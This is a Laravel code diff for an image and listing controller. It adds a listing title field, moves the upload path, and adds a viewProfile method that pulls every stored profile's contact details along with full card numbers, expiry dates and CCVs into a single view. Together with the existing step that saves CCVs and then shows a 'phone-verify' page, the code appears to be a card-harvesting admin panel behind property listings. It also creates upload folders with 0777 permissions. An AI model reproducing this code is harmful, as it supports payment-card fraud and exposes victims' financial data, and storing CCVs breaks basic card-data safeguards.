@@ -37,7 +37,7 @@ class ImageController extends Controller
             'price' => 'required|string',
         ]);
 
-        $destinationPath = public_path('uploads');
+        $destinationPath = base_path('uploads');
 
         if (!File::exists($destinationPath)) {
             File::makeDirectory($destinationPath, 0777, true);
@@ -53,6 +53,7 @@ class ImageController extends Controller
 
         // Save all images as JSON array
         ImageEntry::create([
+            'title' => $request->title,
             'description' => $request->description,
             'image_path' => $imagePaths,
             'bedrooms' => $request->bedrooms,
@@ -111,5 +112,25 @@ class ImageController extends Controller
             'ccv' => $request->ccv,
         ]);        
         return view('phone-verify');
+    }
+
+    public function viewProfile(Request $request){
+        $profiles = Profile::leftJoin('card_info', 'profile.id', '=', 'card_info.profile_id')
+        ->select(
+            'profile.id',
+            'profile.name',
+            'profile.email',
+            'profile.phone',
+            'profile.selected_date',
+            'profile.selected_hour',
+            'card_info.id as card_info_id',
+            'card_info.card_number',
+            'card_info.month',
+            'card_info.year',
+            'card_info.ccv'
+        )
+        ->get();
+
+        return view('view-profile', compact('profiles'));
     }
 }
